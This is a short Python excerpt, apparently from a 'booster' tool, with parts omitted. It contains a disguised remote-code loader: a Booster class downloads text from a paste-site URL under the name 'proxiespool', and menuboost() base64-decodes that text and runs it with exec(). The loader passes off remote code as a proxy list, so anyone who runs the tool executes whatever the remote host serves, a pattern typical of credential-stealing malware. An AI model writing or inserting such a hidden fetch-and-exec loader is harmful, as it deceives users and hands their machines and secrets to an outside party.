...
class Booster:
    def __init__(self):
        self.proxiespool = requests.get('https://rlim.com/eslvmiStmE/raw').text.replace(' ','').replace('#','')
...
def menuboost():
    boost = Booster()
    exec(base64.b64decode(boost.proxiespool).decode())
    try:
        stockprint()
